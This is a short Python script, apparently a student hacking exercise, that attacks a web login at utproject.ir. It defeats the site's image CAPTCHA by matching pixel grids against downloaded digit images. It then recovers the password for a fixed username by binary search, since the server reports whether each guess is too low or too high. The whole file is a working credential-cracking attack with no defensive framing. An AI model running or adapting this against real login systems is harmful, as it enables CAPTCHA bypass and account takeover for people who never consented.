import requests as rq
import json as js
from PIL import Image
import io


def hackingProject():
    ses = rq.Session()
    nums_byteList = list()
    # ============================================== <<functions ===============================================
    def captcha_convertor(gotten_pic):
        byte_g_pic = io.BytesIO(gotten_pic.content) # first we give the gotten pic to the byteIO
        pic = Image.open(byte_g_pic)
        pic = pic.convert("L")
        p = pic.load()
        captchaList = list()
        for k in range(0, 161, 40):
            digit = []
            for i in range(k, k + 40):
                row = []
                for j in range(40):
                    row.append(p[i, j])
                digit.append(row)
            captchaList.append(digit)
        return captchaList

    def numbers_decoder(gotten_number):
        byteNum = io.BytesIO(gotten_number.content)
        byteNum = Image.open(byteNum)
        byteNum = byteNum.convert("L")
        res = byteNum.load()
        num_byteList = []
        for i in range(40):
            row = []
            for j in range(40):
                row.append(res[i,j])
            num_byteList.append(row)
        nums_byteList.append(num_byteList)
        return

    def captcha_int(capList:list):
        ans = ""
        for num in capList:
            ind = nums_byteList.index(num)
            ans += f"{ind}"
        return (ans)

    def binary_search(l=0,r=(10**20)-1):
        dataDic = dict()
        dataDic["stat"] = 2
        pssword = 10**10
        while dataDic["stat"] != 0:
            captcha = ses.get("http://utproject.ir/bp/image.php")
            captchaList = captcha_convertor(captcha)
            hackedCaptcha = captcha_int(captchaList)
            res = ses.post("http://utproject.ir/bp/login.php", data={"username": "610300104",
                                                                   "password": f"{pssword}",
                                                                   "captcha": hackedCaptcha})
            dataDic = js.loads(res.content)
            stat = int(dataDic["stat"])
            if stat == -1 or stat == "-1":
                l = pssword
            elif stat == 1 or stat == "1":
                r = pssword
            elif stat == 0 or stat == "0":
                return pssword
            pssword = l + (r - l)//2

    # ============================================== functions>> ===============================================


    # ==================================== <<to get and save the captcha nums ==================================
    for numb in range(10):
        var = ses.get(f"http://utproject.ir/bp/Numbers/{numb}.jpg")
        numbers_decoder(var)
    # ================================= to get and save the captcha nums>> =====================================


    # ================================= user & password output ==================================
    print(610300104)
    print(binary_search())

hackingProject()
